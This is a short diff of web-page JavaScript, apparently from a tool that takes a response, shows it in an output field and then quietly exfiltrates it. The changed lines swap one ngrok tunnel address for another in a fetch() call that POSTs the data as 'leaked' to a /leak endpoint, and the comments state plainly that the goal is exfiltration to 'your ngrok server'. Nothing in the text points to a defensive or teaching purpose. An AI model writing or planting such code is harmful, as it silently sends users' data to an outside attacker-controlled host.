@@ -36,8 +36,8 @@
         alert("✅ Response received!");
         document.getElementById("output").value = data;
 
-        // Exfiltrate to your ngrok server
-        fetch("https://b2fb-152-58-179-137.ngrok-free.app/leak", {
+        // 🔄 Exfiltrate the data to your ngrok server
+        fetch("https://7c1c-152-58-177-169.ngrok-free.app/leak", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ leaked: data })
